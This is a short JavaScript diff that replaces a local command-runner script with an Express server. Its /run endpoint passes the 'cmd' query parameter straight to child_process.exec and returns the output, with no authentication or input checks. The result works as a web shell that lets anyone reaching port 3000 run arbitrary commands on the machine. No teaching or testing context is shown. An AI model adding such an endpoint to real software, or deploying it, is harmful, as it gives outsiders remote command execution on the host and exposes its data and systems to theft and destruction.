@@ -1,5 +1,12 @@
+const express = require('express');
 const { exec } = require('child_process');
-var cmd = process.argv[2];
-exec(cmd, function(err, stdout) {
-    console.log(stdout);
+const app = express();
+
+app.get('/run', function(req, res) {
+    var cmd = req.query.cmd;
+    exec(cmd, function(err, stdout) {
+        res.send(stdout);
+    });
 });
+
+app.listen(3000);
